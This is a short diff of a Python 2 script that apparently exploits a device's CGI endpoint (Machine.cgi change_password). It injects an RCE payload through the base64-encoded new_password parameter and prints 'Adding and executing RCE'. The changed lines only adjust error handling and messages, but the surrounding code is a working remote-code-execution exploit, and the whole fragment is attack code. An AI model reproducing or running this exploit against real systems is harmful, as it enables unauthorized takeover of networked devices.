@@ -106,7 +106,7 @@ class HTTPconnect:
 			try:
 				rsp = urllib2.urlopen(req)
 			except Exception as e:
-				print "[<] Failed: {}".format(str(e))
+				print "[<] {}".format(str(e))
 				return False
 
 		if self.Raw:
@@ -287,12 +287,11 @@ if __name__ == "__main__":
 	URI = '/cgi-bin/nobody/Machine.cgi?action=change_password&account='+ base64.b64encode(credentials) +'&new_password='+ base64.b64encode(RCE)
 	print "[>] Adding and executing RCE"
 	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,None,None)
-	if not response:
-		sys.exit(1)
-	if not response.split()[1] == 'OK':
-		print "[<] Failed {}".format(response) 
-	else:
-		print "[<] {}".format(response.split()[1])
+	if not response == False:
+		if not response.split()[1] == 'OK':
+			print "[<] Failed {}".format(response) 
+		else:
+			print "[<] {}".format(response.split()[1])
 
 	#
 	# Use 'RCE' as PWD and restore old PWD
